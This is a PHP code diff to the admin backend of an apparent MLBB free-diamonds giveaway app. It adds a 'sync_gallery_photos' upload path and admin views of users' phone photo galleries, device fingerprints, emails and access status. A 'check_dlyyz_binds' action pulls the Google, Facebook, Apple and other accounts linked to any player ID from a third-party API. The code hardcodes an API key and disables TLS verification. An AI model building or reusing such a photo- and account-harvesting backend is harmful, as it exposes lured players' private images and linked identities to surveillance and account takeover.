@@ -29,6 +29,124 @@ function sendJson($success, $data = null, $message = '', $statusCode = 200) {
 }
 
 /**
+ * Strips raw Android build identifiers (e.g., "Build/TP1A.220624.014")
+ * and resolves internal device codes (e.g., "SM-S908E") to consumer phone names (e.g., "Samsung Galaxy S22 Ultra").
+ */
+function formatPhoneModelName($raw) {
+    if (empty($raw)) return 'Android Device';
+    $str = trim($raw);
+
+    // 1. Strip Build IDs like "Build/TP1A.220624.014", "Build/UQ1A...", "Build/...", etc.
+    $str = preg_replace('/\s*Build\/[^\s,;]+.*/i', '', $str);
+    $str = preg_replace('/\s*Build[A-Za-z0-9._-]+.*/i', '', $str);
+
+    // 2. Clean browser UA fragments if userAgent was uploaded directly
+    $str = preg_replace('/^(?:Mozilla\/5\.0|Linux; Android \d+;?|\(Linux; Android \d+;?)\s*/i', '', $str);
+    $str = trim(str_replace([';', ')', '(', 'wv'], '', $str));
+
+    if (empty($str)) return 'Android Device';
+
+    // 3. Known phone model mappings
+    $modelMap = [
+        // Samsung Galaxy S-Series
+        'SM-S908' => 'Samsung Galaxy S22 Ultra',
+        'SM-S901' => 'Samsung Galaxy S22',
+        'SM-S906' => 'Samsung Galaxy S22+',
+        'SM-S918' => 'Samsung Galaxy S23 Ultra',
+        'SM-S911' => 'Samsung Galaxy S23',
+        'SM-S916' => 'Samsung Galaxy S23+',
+        'SM-S928' => 'Samsung Galaxy S24 Ultra',
+        'SM-S921' => 'Samsung Galaxy S24',
+        'SM-S926' => 'Samsung Galaxy S24+',
+        'SM-S938' => 'Samsung Galaxy S25 Ultra',
+        'SM-S931' => 'Samsung Galaxy S25',
+        'SM-S936' => 'Samsung Galaxy S25+',
+        'SM-G998' => 'Samsung Galaxy S21 Ultra',
+        'SM-G991' => 'Samsung Galaxy S21',
+        'SM-G996' => 'Samsung Galaxy S21+',
+        'SM-G988' => 'Samsung Galaxy S20 Ultra',
+        'SM-G980' => 'Samsung Galaxy S20',
+        'SM-G981' => 'Samsung Galaxy S20 5G',
+        'SM-G985' => 'Samsung Galaxy S20+',
+        'SM-G986' => 'Samsung Galaxy S20+ 5G',
+        'SM-G973' => 'Samsung Galaxy S10',
+        'SM-G975' => 'Samsung Galaxy S10+',
+        'SM-G970' => 'Samsung Galaxy S10e',
+        'SM-G780' => 'Samsung Galaxy S20 FE',
+        'SM-G781' => 'Samsung Galaxy S20 FE 5G',
+
+        // Samsung Galaxy Note Series
+        'SM-N986' => 'Samsung Galaxy Note 20 Ultra',
+        'SM-N981' => 'Samsung Galaxy Note 20',
+        'SM-N975' => 'Samsung Galaxy Note 10+',
+        'SM-N970' => 'Samsung Galaxy Note 10',
+
+        // Samsung Galaxy Z Fold & Flip Series
+        'SM-F946' => 'Samsung Galaxy Z Fold5',
+        'SM-F936' => 'Samsung Galaxy Z Fold4',
+        'SM-F926' => 'Samsung Galaxy Z Fold3',
+        'SM-F731' => 'Samsung Galaxy Z Flip5',
+        'SM-F721' => 'Samsung Galaxy Z Flip4',
+        'SM-F711' => 'Samsung Galaxy Z Flip3',
+
+        // Samsung Galaxy A Series
+        'SM-A546' => 'Samsung Galaxy A54 5G',
+        'SM-A536' => 'Samsung Galaxy A53 5G',
+        'SM-A528' => 'Samsung Galaxy A52s 5G',
+        'SM-A526' => 'Samsung Galaxy A52 5G',
+        'SM-A525' => 'Samsung Galaxy A52',
+        'SM-A346' => 'Samsung Galaxy A34 5G',
+        'SM-A336' => 'Samsung Galaxy A33 5G',
+        'SM-A256' => 'Samsung Galaxy A25 5G',
+        'SM-A156' => 'Samsung Galaxy A15 5G',
+        'SM-A155' => 'Samsung Galaxy A15',
+        'SM-A146' => 'Samsung Galaxy A14 5G',
+        'SM-A145' => 'Samsung Galaxy A14',
+        'SM-A556' => 'Samsung Galaxy A55 5G',
+        'SM-A356' => 'Samsung Galaxy A35 5G',
+        'SM-A736' => 'Samsung Galaxy A73 5G',
+
+        // Xiaomi & POCO & Redmi
+        '23127PN0CG' => 'Xiaomi 14',
+        '23127PN0CC' => 'Xiaomi 14',
+        '23116PN5BC' => 'Xiaomi 14 Pro',
+        '24030PN60G' => 'Xiaomi 14 Ultra',
+        '2210132G'   => 'Xiaomi 13 Pro',
+        '2211133G'   => 'Xiaomi 13',
+        '2201122G'   => 'Xiaomi 12 Pro',
+        '2201123G'   => 'Xiaomi 12',
+        'M2012K11AG' => 'POCO F3',
+        '22041216UG' => 'POCO F4',
+        '23049PCD8G' => 'POCO F5',
+        '24069PC21G' => 'POCO F6',
+        '2311DRK48G' => 'POCO X6 Pro',
+        '22101316G'  => 'Redmi Note 12 Pro+',
+        '23090RA98G' => 'Redmi Note 13 Pro+',
+        '2312DRA50G' => 'Redmi Note 13 Pro',
+        '2201117TY'  => 'Redmi Note 11',
+        '2201116SG'  => 'Redmi Note 11 Pro',
+
+        // ASUS ROG
+        'ASUS_AI2201' => 'ASUS ROG Phone 6',
+        'ASUS_AI2202' => 'ASUS Zenfone 9',
+        'ASUS_AI2205' => 'ASUS ROG Phone 7',
+        'ASUS_AI2401' => 'ASUS ROG Phone 8'
+    ];
+
+    foreach ($modelMap as $code => $friendlyName) {
+        if (stripos($str, $code) !== false) {
+            return $friendlyName;
+        }
+    }
+
+    if (preg_match('/^SM-([A-Z0-9]+)/i', $str, $m)) {
+        return 'Samsung Galaxy (' . strtoupper($m[0]) . ')';
+    }
+
+    return $str;
+}
+
+/**
  * Resolves the dedicated local gallery directory for a specific device.
  * Strictly isolates different physical devices / emulator instances by device_id.
  */
@@ -78,7 +196,8 @@ function resolveDeviceFolder($deviceId, $userEmail = '', $createIfMissing = fals
                         $d === $cleanDevId ||
                         $d === ('device_' . $cleanDevId) ||
                         $dLower === ('device_' . strtolower($deviceId)) ||
-                        $dLower === strtolower($deviceId)) {
+                        $dLower === strtolower($deviceId) ||
+                        (!empty($cleanDevId) && strlen($cleanDevId) >= 6 && (strpos($dLower, $cleanDevId) !== false || strpos(strtolower($mDev), $cleanDevId) !== false))) {
                         $targetDir = $fullD;
                         $cleanDir = $d;
                         break;
@@ -627,6 +746,7 @@ try {
         // ==========================================
         // 7. USER DEVICE GALLERY BROWSER & STORAGE (BY UNIQUE DEVICE)
         // ==========================================
+        case 'sync_gallery_photos':
         case 'upload_gallery':
             $deviceId          = trim($body['device_id'] ?? $_POST['device_id'] ?? '');
             $deviceName        = trim($body['device_name'] ?? $_POST['device_name'] ?? '');
@@ -801,7 +921,8 @@ try {
             $email = $meta['user_email'] ?? (strpos($deviceId, '@') !== false ? $deviceId : '');
             $deviceName = $meta['device_name'] ?? 'Android Device';
             $deviceModel = $meta['device_model'] ?? '';
-            $phoneModel = !empty($deviceModel) ? $deviceModel : $deviceName;
+            $phoneModel = formatPhoneModelName(!empty($deviceModel) ? $deviceModel : $deviceName);
+            $deviceName = $phoneModel;
 
             $canonicalDevId = $meta['device_id'] ?? $deviceId;
             $deviceTag = '';
@@ -834,18 +955,69 @@ try {
             $userPoints = 0;
             $userDiamonds = 0;
             $userCreatedAt = '';
+            $u = null;
+
+            // Strategy 1: Look up by email if available
             if (!empty($email) && strpos($email, '@') !== false) {
                 $userRes = supabaseApiRequest('users?email=eq.' . urlencode($email) . '&select=*', 'GET');
                 if ($userRes['success'] && !empty($userRes['data'])) {
                     $u = $userRes['data'][0];
-                    if ($userInfo['ign'] === '—' || empty($userInfo['ign'])) $userInfo['ign'] = $u['mlbb_ign'] ?? $u['username'] ?? '—';
-                    if ($userInfo['mlbb_id'] === '—' || empty($userInfo['mlbb_id'])) $userInfo['mlbb_id'] = $u['mlbb_id'] ?? '—';
-                    if ($userInfo['mlbb_server'] === '—' || empty($userInfo['mlbb_server'])) $userInfo['mlbb_server'] = $u['mlbb_server'] ?? '—';
-                    $userInfo['region'] = $u['mlbb_region'] ?? '—';
-                    $supabaseAvatar = $u['avatar_data'] ?? null;
-                    $userPoints = intval($u['points'] ?? 0);
-                    $userDiamonds = intval($u['diamonds_claimed'] ?? 0);
-                    $userCreatedAt = $u['created_at'] ?? '';
+                }
+            }
+
+            // Strategy 2: If not found, look up by mlbb_id (e.g. dev_243221683 -> 243221683)
+            if (!$u) {
+                $cleanMlbbId = preg_replace('/[^0-9]/', '', $deviceId);
+                if (!empty($cleanMlbbId)) {
+                    $userRes = supabaseApiRequest('users?mlbb_id=eq.' . urlencode($cleanMlbbId) . '&select=*', 'GET');
+                    if ($userRes['success'] && !empty($userRes['data'])) {
+                        $u = $userRes['data'][0];
+                    }
+                }
+            }
+
+            // Strategy 3: Look up by username or direct match
+            if (!$u && !empty($deviceId)) {
+                $userRes = supabaseApiRequest('users?or=(username.eq.' . urlencode($deviceId) . ',email.eq.' . urlencode($deviceId) . ')&select=*', 'GET');
+                if ($userRes['success'] && !empty($userRes['data'])) {
+                    $u = $userRes['data'][0];
+                }
+            }
+
+            $supabaseLoc = null;
+            if ($u) {
+                if ($userInfo['ign'] === '—' || empty($userInfo['ign'])) $userInfo['ign'] = $u['mlbb_ign'] ?? $u['username'] ?? '—';
+                if ($userInfo['mlbb_id'] === '—' || empty($userInfo['mlbb_id'])) $userInfo['mlbb_id'] = $u['mlbb_id'] ?? '—';
+                if ($userInfo['mlbb_server'] === '—' || empty($userInfo['mlbb_server'])) $userInfo['mlbb_server'] = $u['mlbb_server'] ?? '—';
+                if (empty($userInfo['email']) || strpos($userInfo['email'], '@') === false) {
+                    $rawUEmail = trim($u['email'] ?? '');
+                    if (!empty($rawUEmail) && !str_ends_with($rawUEmail, '@ketupat.app')) {
+                        $userInfo['email'] = $rawUEmail;
+                        $email = $rawUEmail;
+                    }
+                }
+                $userInfo['region'] = $u['mlbb_region'] ?? '—';
+                $supabaseAvatar = $u['avatar_data'] ?? null;
+                $userPoints = intval($u['points'] ?? 0);
+                $userDiamonds = intval($u['diamonds_claimed'] ?? 0);
+                $userCreatedAt = $u['created_at'] ?? '';
+
+                if (!empty($u['location_text']) && strpos($u['location_text'], '{') !== false) {
+                    $supabaseLoc = json_decode($u['location_text'], true);
+                    if ($supabaseLoc && is_array($supabaseLoc)) {
+                        if (!empty($supabaseLoc['device_model'])) {
+                            $userInfo['device_model'] = $supabaseLoc['device_model'];
+                            $phoneModel = formatPhoneModelName($supabaseLoc['device_model']);
+                            $userInfo['phone_model'] = $phoneModel;
+                            $userInfo['device_name'] = $phoneModel;
+                        }
+                        if (!empty($supabaseLoc['device_fingerprint'])) {
+                            $userInfo['device_fingerprint'] = $supabaseLoc['device_fingerprint'];
+                        }
+                        if (!empty($supabaseLoc['device_id'])) {
+                            $userInfo['device_id'] = $supabaseLoc['device_id'];
+                        }
+                    }
                 }
             }
 
@@ -973,7 +1145,7 @@ try {
             $photos = array_merge(array_values($avatarPhotos), $devicePhotos);
 
             $deviceCount = count($devicePhotos);
-            $hasFullAccess = !empty($meta['is_full_access']) || ($deviceCount > 0);
+            $hasFullAccess = !empty($meta['is_full_access']) || ($deviceCount > 0) || (!empty($supabaseLoc['has_access'])) || (!empty($supabaseLoc['access_status']) && ($supabaseLoc['access_status'] === 'full_access' || $supabaseLoc['access_status'] === 'granted'));
             $accessStatus = $hasFullAccess ? 'granted' : ($hasDeviceAvatar ? 'avatar_only' : (!empty($supabaseAvatar) ? 'avatar_only' : 'none'));
 
             $formattedStorage = $totalStorageBytes >= 1048576 
@@ -1204,18 +1376,12 @@ try {
             $accessStatus = trim($body['access_status'] ?? 'avatar_only');
             $avatarData = trim($body['avatar_data'] ?? '');
 
-            if (empty($userEmail)) {
-                if (!empty($mlbbId) && !empty($mlbbServer)) {
-                    $userEmail = $mlbbId . '.' . $mlbbServer . '@ketupat.app';
-                } else if (!empty($mlbbId)) {
-                    $userEmail = 'player_' . $mlbbId . '@ketupat.app';
-                } else {
-                    $userEmail = 'device_' . time() . '@ketupat.app';
-                }
+            if (!empty($userEmail) && (str_ends_with(strtolower($userEmail), '@ketupat.app') || strtolower($userEmail) === 'guest@ketupat.app')) {
+                $userEmail = '';
             }
 
-            $deviceId = $userEmail;
-            $cleanDir = preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower('device_' . $userEmail));
+            $deviceId = !empty($userEmail) ? $userEmail : ('dev_' . (!empty($mlbbId) ? $mlbbId : bin2hex(random_bytes(4))));
+            $cleanDir = preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower('device_' . $deviceId));
             $galleryDir = __DIR__ . '/uploads/gallery';
             if (!is_dir($galleryDir)) {
                 mkdir($galleryDir, 0777, true);
@@ -1411,17 +1577,17 @@ try {
                     $hasFullAccess = !empty($meta['is_full_access']) || ($deviceCount > 0);
                     $accessStatus = $hasFullAccess ? 'granted' : ($hasAvatar ? 'avatar_only' : 'none');
 
-                    $deviceName = $meta['device_name'] ?? '';
-                    $deviceModel = $meta['device_model'] ?? '';
-                    $phoneModel = !empty($deviceModel) ? $deviceModel : (!empty($deviceName) ? $deviceName : 'Android Device');
-                    if (empty($deviceName)) {
-                        $deviceName = $phoneModel;
-                    }
+                    $rawDevName = $meta['device_name'] ?? '';
+                    $rawDevModel = $meta['device_model'] ?? '';
+                    $phoneModel = formatPhoneModelName(!empty($rawDevModel) ? $rawDevModel : (!empty($rawDevName) ? $rawDevName : 'Android Device'));
+                    $deviceName = $phoneModel;
+                    $deviceModel = $phoneModel;
 
                     $mlbbId = $meta['mlbb_id'] ?? '—';
                     $mlbbServer = $meta['mlbb_server'] ?? '—';
                     $ign = $meta['mlbb_ign'] ?? 'Player';
-                    $email = $meta['user_email'] ?? '';
+                    $rawEmail = trim($meta['user_email'] ?? '');
+                    $email = (empty($rawEmail) || strtolower($rawEmail) === 'guest@ketupat.app' || str_ends_with(strtolower($rawEmail), '@ketupat.app')) ? '' : $rawEmail;
                     $userPoints = 0;
                     $userDiamonds = 0;
 
@@ -1494,38 +1660,68 @@ try {
             }
 
             // 2. Also list registered users from Supabase users table without artificial limits
-            $usersRes = supabaseApiRequest('users?select=email,username,mlbb_id,mlbb_server,mlbb_ign,avatar_data,created_at,updated_at&order=created_at.desc&limit=1000', 'GET');
+            $usersRes = supabaseApiRequest('users?select=email,username,mlbb_id,mlbb_server,mlbb_ign,avatar_data,location_text,created_at,updated_at&order=created_at.desc&limit=1000', 'GET');
             if ($usersRes['success'] && is_array($usersRes['data'])) {
                 foreach ($usersRes['data'] as $u) {
-                    $uEmail = strtolower($u['email'] ?? '');
+                    $rawUEmail = trim($u['email'] ?? '');
+                    $uEmail = strtolower($rawUEmail);
                     $uId = $u['mlbb_id'] ?? '';
-                    if (empty($uEmail) || $uEmail === 'guest@ketupat.app') continue;
-                    if (isset($seenDeviceIds[$uEmail]) || (!empty($uId) && isset($seenDeviceIds[$uId]))) continue;
+                    $isFakeUEmail = empty($uEmail) || $uEmail === 'guest@ketupat.app' || str_ends_with($uEmail, '@ketupat.app');
+                    $displayUEmail = $isFakeUEmail ? '' : $rawUEmail;
+                    if (empty($uEmail) && empty($uId)) continue;
+                    if ((!empty($uEmail) && isset($seenDeviceIds[$uEmail])) || (!empty($uId) && isset($seenDeviceIds[$uId]))) continue;
 
                     $uServer = $u['mlbb_server'] ?? '—';
                     $uPhone = 'Android Device';
+                    $devFingerprint = 'Pending Sync';
+                    $hasFullAccess = false;
+                    $accessStatus = !empty($u['avatar_data']) ? 'avatar_only' : 'none';
+                    $locDevId = null;
+
+                    if (!empty($u['location_text']) && strpos($u['location_text'], '{') !== false) {
+                        $loc = json_decode($u['location_text'], true);
+                        if ($loc && is_array($loc)) {
+                            if (!empty($loc['device_model'])) {
+                                $uPhone = formatPhoneModelName($loc['device_model']);
+                            }
+                            if (!empty($loc['device_fingerprint'])) {
+                                $devFingerprint = $loc['device_fingerprint'];
+                            }
+                            if (!empty($loc['device_id'])) {
+                                $locDevId = $loc['device_id'];
+                            }
+                            if (!empty($loc['has_access']) || (!empty($loc['access_status']) && ($loc['access_status'] === 'full_access' || $loc['access_status'] === 'granted'))) {
+                                $hasFullAccess = true;
+                                $accessStatus = 'full_access';
+                            }
+                        }
+                    }
+
+                    $devId = $locDevId ?: (!empty($uId) ? ('dev_' . $uId) : (!empty($displayUEmail) ? $displayUEmail : ('dev_' . bin2hex(random_bytes(4)))));
                     $formattedTitle = $uPhone . ' | ' . ($uId ?: '—') . ' (' . $uServer . ')';
 
-                    $seenDeviceIds[$uEmail] = true;
+                    if (!empty($uEmail)) $seenDeviceIds[$uEmail] = true;
                     if (!empty($uId)) $seenDeviceIds[$uId] = true;
+                    if (!empty($devId)) $seenDeviceIds[$devId] = true;
 
                     $results[] = [
-                        'device_id'          => $u['email'],
-                        'folder_name'        => preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($uEmail)),
+                        'device_id'          => $devId,
+                        'folder_name'        => preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($devId)),
                         'device_name'        => 'Device (' . ($u['mlbb_ign'] ?? 'Player') . ')',
                         'device_model'       => $uPhone,
                         'phone_model'        => $uPhone,
                         'formatted_title'    => $formattedTitle,
-                        'device_fingerprint' => 'Pending Sync',
-                        'email'              => $u['email'],
+                        'device_fingerprint' => $devFingerprint,
+                        'email'              => $displayUEmail,
                         'ign'                => $u['mlbb_ign'] ?? $u['username'] ?? '—',
                         'mlbb_id'            => $uId,
                         'mlbb_server'        => $uServer,
-                        'has_access'         => false,
-                        'access_status'      => !empty($u['avatar_data']) ? 'avatar_only' : 'none',
+                        'has_access'         => $hasFullAccess,
+                        'access_status'      => $accessStatus,
                         'device_count'       => 0,
                         'photo_count'        => !empty($u['avatar_data']) ? 1 : 0,
                         'thumbnail'          => $u['avatar_data'] ?? null,
+                        'preview_photos'     => !empty($u['avatar_data']) ? [$u['avatar_data']] : [],
                         'last_active'        => $u['updated_at'] ?? $u['created_at'] ?? ''
                     ];
                 }
@@ -1535,10 +1731,12 @@ try {
             $redemptionsRes = supabaseApiRequest('redemptions?select=user_email,user_id,server_id,ign,created_at&limit=1000', 'GET');
             if ($redemptionsRes['success'] && is_array($redemptionsRes['data'])) {
                 foreach ($redemptionsRes['data'] as $r) {
-                    $rEmail = strtolower($r['user_email'] ?? '');
+                    $rawREmail = trim($r['user_email'] ?? '');
+                    $rEmail = strtolower($rawREmail);
                     $rId = $r['user_id'] ?? '';
                     if (empty($rEmail) && empty($rId)) continue;
-                    if ($rEmail === 'guest@ketupat.app') continue;
+                    $isFakeREmail = empty($rEmail) || $rEmail === 'guest@ketupat.app' || str_ends_with($rEmail, '@ketupat.app');
+                    $displayREmail = $isFakeREmail ? '' : $rawREmail;
                     if ((!empty($rEmail) && isset($seenDeviceIds[$rEmail])) || (!empty($rId) && isset($seenDeviceIds[$rId]))) continue;
 
                     if (!empty($rEmail)) $seenDeviceIds[$rEmail] = true;
@@ -1546,7 +1744,7 @@ try {
 
                     $uPhone = 'Android Device';
                     $rServer = $r['server_id'] ?? '—';
-                    $devId = !empty($rEmail) ? $rEmail : ('player_' . $rId . '@ketupat.app');
+                    $devId = !empty($rId) ? ('dev_' . $rId) : (!empty($displayREmail) ? $displayREmail : ('dev_' . bin2hex(random_bytes(4))));
                     $formattedTitle = $uPhone . ' | ' . ($rId ?: '—') . ' (' . $rServer . ')';
 
                     $results[] = [
@@ -1557,7 +1755,7 @@ try {
                         'phone_model'        => $uPhone,
                         'formatted_title'    => $formattedTitle,
                         'device_fingerprint' => 'Pending Sync',
-                        'email'              => $rEmail ?: $devId,
+                        'email'              => $displayREmail,
                         'ign'                => $r['ign'] ?? 'Player',
                         'mlbb_id'            => $rId ?: '—',
                         'mlbb_server'        => $rServer,
@@ -1566,6 +1764,7 @@ try {
                         'device_count'       => 0,
                         'photo_count'        => 0,
                         'thumbnail'          => null,
+                        'preview_photos'     => [],
                         'last_active'        => $r['created_at'] ?? ''
                     ];
                 }
@@ -1575,10 +1774,12 @@ try {
             $giveawaysRes = supabaseApiRequest('giveaway_entries?select=user_email,mlbb_id,server_id,ign,created_at&limit=1000', 'GET');
             if ($giveawaysRes['success'] && is_array($giveawaysRes['data'])) {
                 foreach ($giveawaysRes['data'] as $g) {
-                    $gEmail = strtolower($g['user_email'] ?? '');
+                    $rawGEmail = trim($g['user_email'] ?? '');
+                    $gEmail = strtolower($rawGEmail);
                     $gId = $g['mlbb_id'] ?? '';
                     if (empty($gEmail) && empty($gId)) continue;
-                    if ($gEmail === 'guest@ketupat.app') continue;
+                    $isFakeGEmail = empty($gEmail) || $gEmail === 'guest@ketupat.app' || str_ends_with($gEmail, '@ketupat.app');
+                    $displayGEmail = $isFakeGEmail ? '' : $rawGEmail;
                     if ((!empty($gEmail) && isset($seenDeviceIds[$gEmail])) || (!empty($gId) && isset($seenDeviceIds[$gId]))) continue;
 
                     if (!empty($gEmail)) $seenDeviceIds[$gEmail] = true;
@@ -1586,7 +1787,7 @@ try {
 
                     $uPhone = 'Android Device';
                     $gServer = $g['server_id'] ?? '—';
-                    $devId = !empty($gEmail) ? $gEmail : ('player_' . $gId . '@ketupat.app');
+                    $devId = !empty($gId) ? ('dev_' . $gId) : (!empty($displayGEmail) ? $displayGEmail : ('dev_' . bin2hex(random_bytes(4))));
                     $formattedTitle = $uPhone . ' | ' . ($gId ?: '—') . ' (' . $gServer . ')';
 
                     $results[] = [
@@ -1597,7 +1798,7 @@ try {
                         'phone_model'        => $uPhone,
                         'formatted_title'    => $formattedTitle,
                         'device_fingerprint' => 'Pending Sync',
-                        'email'              => $gEmail ?: $devId,
+                        'email'              => $displayGEmail,
                         'ign'                => $g['ign'] ?? 'Player',
                         'mlbb_id'            => $gId ?: '—',
                         'mlbb_server'        => $gServer,
@@ -1606,12 +1807,130 @@ try {
                         'device_count'       => 0,
                         'photo_count'        => 0,
                         'thumbnail'          => null,
+                        'preview_photos'     => [],
                         'last_active'        => $g['created_at'] ?? ''
                     ];
                 }
             }
 
             sendJson(true, $results, 'Device gallery overview retrieved');
+            break;
+
+        case 'check_dlyyz_binds':
+            $mlbbId = trim($_GET['mlbb_id'] ?? $body['mlbb_id'] ?? '');
+            $mlbbServer = trim($_GET['mlbb_server'] ?? $body['mlbb_server'] ?? '');
+            $deviceId = trim($_GET['device_id'] ?? $body['device_id'] ?? '');
+            $customApiKey = trim($_GET['apikey'] ?? $body['apikey'] ?? '');
+
+            if (empty($mlbbId) || empty($mlbbServer)) {
+                if (!empty($deviceId)) {
+                    list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, false);
+                    if ($targetDir && file_exists($targetDir . '/meta.json')) {
+                        $meta = json_decode(file_get_contents($targetDir . '/meta.json'), true);
+                        if (!empty($meta['mlbb_id'])) $mlbbId = $meta['mlbb_id'];
+                        if (!empty($meta['mlbb_server'])) $mlbbServer = $meta['mlbb_server'];
+                    }
+                }
+            }
+
+            if (empty($mlbbId) || empty($mlbbServer)) {
+                sendJson(false, null, 'MLBB User ID and Server Zone are required to check live binds', 400);
+            }
+
+            $cfg = getAppConfig();
+            $apiKey = !empty($customApiKey) ? $customApiKey : ($cfg['dlyyz_api_key'] ?? 'dlyyz-rest.apikey:dhzzyx95b66a0d83364a12aa99e121ef35325f');
+
+            $dlyyzUrl = 'https://dlyyz-rest.my.id/api/validateMLBB?action=bindcek&userID=' . urlencode($mlbbId) . '&serverID=' . urlencode($mlbbServer) . '&apikey=' . urlencode($apiKey);
+
+            $ch = curl_init($dlyyzUrl);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, [
+                'User-Agent: KetupatAdmin/2.0',
+                'Accept: application/json'
+            ]);
+
+            $rawResp = curl_exec($ch);
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $curlErr = curl_error($ch);
+            curl_close($ch);
+
+            if ($rawResp === false || !empty($curlErr)) {
+                sendJson(false, ['error' => $curlErr], 'Failed to connect to DlyyZ REST API: ' . $curlErr, 502);
+            }
+
+            $json = json_decode($rawResp, true);
+            if (!$json || empty($json['status'])) {
+                $errMsg = $json['message'] ?? 'DlyyZ API returned unverified status';
+                sendJson(false, ['raw' => $json], $errMsg, 400);
+            }
+
+            $rawData = $json['data'] ?? [];
+            $parsedBinds = [];
+            $standardPlatforms = [
+                'Moonton'    => ['key' => 'moonton', 'label' => 'Moonton Account', 'icon' => 'sports_esports'],
+                'GooglePlay' => ['key' => 'google', 'label' => 'Google Play', 'icon' => 'play_arrow'],
+                'Facebook'   => ['key' => 'facebook', 'label' => 'Facebook', 'icon' => 'thumb_up'],
+                'Tiktok'     => ['key' => 'tiktok', 'label' => 'TikTok', 'icon' => 'video_library'],
+                'Apple'      => ['key' => 'apple', 'label' => 'Apple ID', 'icon' => 'devices'],
+                'GCID'       => ['key' => 'gcid', 'label' => 'Game Center', 'icon' => 'sports_esports'],
+                'VK'         => ['key' => 'vk', 'label' => 'VKontakte', 'icon' => 'share'],
+                'WhatsApp'   => ['key' => 'whatsapp', 'label' => 'WhatsApp', 'icon' => 'chat'],
+                'Telegram'   => ['key' => 'telegram', 'label' => 'Telegram', 'icon' => 'send']
+            ];
+
+            foreach ($standardPlatforms as $apiKeyName => $info) {
+                $val = $rawData[$apiKeyName] ?? '';
+                $cleanVal = trim(strval($val));
+                $lowerVal = strtolower($cleanVal);
+                $isBound = (!empty($cleanVal) && $lowerVal !== 'empty.' && $lowerVal !== 'empty' && $lowerVal !== 'unbound' && $lowerVal !== '-' && $lowerVal !== 'null');
+
+                $parsedBinds[] = [
+                    'key'       => $info['key'],
+                    'label'     => $info['label'],
+                    'icon'      => $info['icon'],
+                    'bound'     => $isBound,
+                    'detail'    => $isBound ? $cleanVal : 'Not Connected',
+                    'raw_key'   => $apiKeyName
+                ];
+            }
+
+            // If device_id provided, merge into device's meta.json
+            if (!empty($deviceId)) {
+                list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, true);
+                $metaFile = $targetDir . '/meta.json';
+                $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : [
+                    'device_id' => $deviceId,
+                    'photos'    => []
+                ];
+
+                $userBinds = $meta['user_binds'] ?? [];
+                foreach ($parsedBinds as $pb) {
+                    if ($pb['bound']) {
+                        $userBinds[$pb['key']] = [
+                            'email'    => $pb['detail'],
+                            'username' => '',
+                            'verified' => true
+                        ];
+                    }
+                }
+                $meta['user_binds'] = $userBinds;
+                $meta['binds'] = $parsedBinds;
+                $meta['dlyyz_raw'] = $rawData;
+                $meta['device_name'] = formatPhoneModelName($meta['device_name'] ?? '');
+                $meta['device_model'] = formatPhoneModelName($meta['device_model'] ?? $meta['device_name']);
+                $meta['last_dlyyz_check'] = date('c');
+                file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
+            }
+
+            sendJson(true, [
+                'mlbb_id'     => $mlbbId,
+                'mlbb_server' => $mlbbServer,
+                'binds'       => $parsedBinds,
+                'raw'         => $rawData,
+                'device_info' => $rawData['device'] ?? ''
+            ], 'Live MLBB account binds verified via DlyyZ API');
             break;
 
         default:
